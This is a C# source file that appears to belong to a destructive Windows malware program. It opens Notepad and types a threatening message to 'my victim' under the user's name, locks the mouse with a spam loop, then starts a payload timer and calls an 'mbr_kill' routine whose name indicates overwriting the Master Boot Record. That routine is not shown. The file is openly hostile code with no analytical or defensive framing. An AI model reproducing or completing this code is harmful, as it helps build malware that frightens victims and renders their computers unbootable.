using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace version1
{
    public class short_message
    {
        public void story()
        {
            Thread.Sleep(5000);
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            string text = "Hello my victim " + userName + "!" +
            "I'm your worst nightmare come true!" +
            "Your entire system is now infected and there is no escape!" + 
            "You are no longer the owner of this system, you are now only my victim!" + 
            "I control all your files and programs, you can't get rid of me!" + 
            "If you think you can destroy me with a antivirus, you are wrong!" +
            "NOTHING CAN STOP ME, I AM UNSTOPPABLE!" + 
            "You only have 6 minutes, 6 seconds and 6 milliseconds to survive!" +  
            "After that, your system will be completely destroyed!" + 
            "Enjoy hell!";
            char[] Mychars = text.ToCharArray();
            Process.Start(@"C:\Windows\notepad.exe");
            Process[] proces_name = Process.GetProcessesByName("notepad");
            while (proces_name.Length == 0) {  }
            Thread.Sleep(1000);
            Thread th_spam = new Thread(mouse_spam);
            th_spam.Start();
            for (int num = 0; num < Mychars.Length; num++){
                int x = Screen.PrimaryScreen.Bounds.Width; int y = Screen.PrimaryScreen.Bounds.Height;
                IntPtr find_win = Dll_Imports.FindWindow("Notepad", null);
                Dll_Imports.MoveWindow(find_win, 50, 50, x/3, y/3, true);
                UInt16 uniCode = Mychars[num];
                Dll_Imports.INPUT[] input = new Dll_Imports.INPUT[2];
                input[0].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[0].U.ki.wScan = (Dll_Imports.ScanCodeShort)uniCode;
                input[0].U.ki.dwFlags = Dll_Imports.KEYEVENTF.UNICODE;
                input[1].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[1].U.ki.wVk = Dll_Imports.VirtualKeyShort.RETURN;
                if (Mychars[num] != '!')
                    Dll_Imports.SendInput(1, input, Marshal.SizeOf(typeof(Dll_Imports.INPUT)));
                else
                    Dll_Imports.SendInput(2, input, Marshal.SizeOf(typeof(Dll_Imports.INPUT)));

                Thread.Sleep(100);
            }
            Thread.Sleep(1000);
            foreach(Process proces_n in proces_name) { proces_n.Kill(); }
            var timer_h = new payload_timer();
            Thread th_timer = new Thread(timer_h.timer);
            th_timer.Start();
            var mbr_h = new mbr_kill();
            mbr_h.MBR_writer();

        }
        public void mouse_spam()
        {
            Process[] proces_name = Process.GetProcessesByName("notepad");
            while (proces_name.Length == 1)
            {
                proces_name = Process.GetProcessesByName("notepad");
                Dll_Imports.SetCursorPos(50, 50);
                Dll_Imports.mouse_event(Dll_Imports.MOUSEEVENTF_LEFTUP, 50, 50, 0, UIntPtr.Zero);
                Thread.Sleep(1);
            }
        }
    }
}
